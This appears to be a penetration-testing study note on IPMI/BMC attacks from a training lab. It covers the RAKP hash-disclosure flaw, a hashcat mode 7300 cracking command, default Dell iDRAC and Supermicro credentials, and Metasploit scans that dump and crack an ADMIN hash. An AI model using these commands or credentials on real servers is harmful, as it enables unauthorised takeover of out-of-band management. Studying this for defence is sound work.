# IPMI
- is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. 
- https://www.thomas-krenn.com/en/wiki/IPMI_Basics
- IPMI is typically used in three ways:
- - Before the OS has booted to modify BIOS settings
- - When the host is fully powered down
- - Access to a host after a system failure
- port 623 but can be differ

#### Components
```
| Component/Interface                            | Description                                                                 |
|------------------------------------------------|-----------------------------------------------------------------------------|
| Baseboard Management Controller (BMC)          | A micro-controller and essential component of an IPMI.                      |
| Intelligent Chassis Management Bus (ICMB)      | An interface that permits communication from one chassis to another.        |
| Intelligent Platform Management Bus (IPMB)     | Extends the BMC functionality to additional components.                     |
| IPMI Memory                                    | Stores items such as the system event log, repository store data, and more. |
| Communications Interfaces                      | Includes local system interfaces, serial and LAN interfaces, ICMB, and PCI Management Bus. |
```

## Configurtaion
### Dangerous Settings
If default credentials fail for a BMC access, a vulnerability in the IPMI 2.0 RAKP protocol can be exploited. During authentication, the server sends a salted SHA1 or MD5 hash of 
the user's password to the client. This hash can be captured and cracked offline for any valid BMC user using Hashcat mode 7300. 
For HP iLO with default passwords, the following Hashcat mask attack can be used: hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u, 
targeting all eight-character combinations of uppercase letters and numbers.

### Standard Username password
| Product            | Username      | Password                                                      |
|--------------------|---------------|---------------------------------------------------------------|
| Dell iDRAC         | root          | calvin                                                        |
| HP iLO             | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI    | ADMIN         | ADMIN                                                         |

## Footprinting
### Nmap
```shell
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

### Metasploit
```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Metasploit Dumping Hashes
```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```